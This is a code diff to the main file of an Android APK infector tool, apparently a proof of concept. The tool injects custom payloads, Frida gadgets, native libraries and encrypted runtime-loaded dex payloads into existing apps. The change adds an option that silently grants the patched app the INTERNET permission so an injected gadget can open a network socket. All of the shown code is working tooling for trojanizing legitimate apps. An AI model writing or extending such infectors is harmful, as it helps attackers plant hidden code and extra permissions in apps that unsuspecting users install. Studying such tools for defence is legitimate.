@@ -17,7 +17,7 @@ import (
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 )
 
-var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)"
+var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)\nenv:\n\tARCHINOME_ADD_INTERNET=1 - also add <uses-permission android:name=\"android.permission.INTERNET\"/>\n\t    to the manifest (needed by the listen-mode gadget of option 2 on hosts that\n\t    declare no INTERNET permission; skipped for option 7)"
 
 func main() {
 
@@ -116,7 +116,7 @@ func main() {
 		// The native vector does not touch the manifest or the dex at all.
 		fmt.Println("	--Native vector: manifest and dex left untouched")
 	} else {
-		fmt.Println("\t--Patching manifest...")
+		fmt.Println("	--Patching manifest...")
 		manifest.Patch()
 
 		fmt.Println("	--Patching dex...")
@@ -125,6 +125,16 @@ func main() {
 		// superclass, string order) before handing it to the injector, and
 		// panics otherwise — a broken stub would brick the app on the device.
 		// The gate lives next to the emitted bytes so it cannot be bypassed.
+	}
+
+	// Opt-in: declare android.permission.INTERNET. The listen-mode frida gadget
+	// (option 2) cannot create its socket without it, and a large part of the
+	// real world declares no INTERNET permission at all. Off by default: the
+	// patched APK then keeps exactly the permission set the host shipped with.
+	// The native vector never touches the manifest, so it is skipped there.
+	if os.Getenv("ARCHINOME_ADD_INTERNET") == "1" && utils.Payload_option != int(utils.Native_payload) {
+		fmt.Println("	--Patching manifest (android.permission.INTERNET)...")
+		manifest.PatchInternetPermission()
 	}
 
 	fmt.Println("Injecting...")
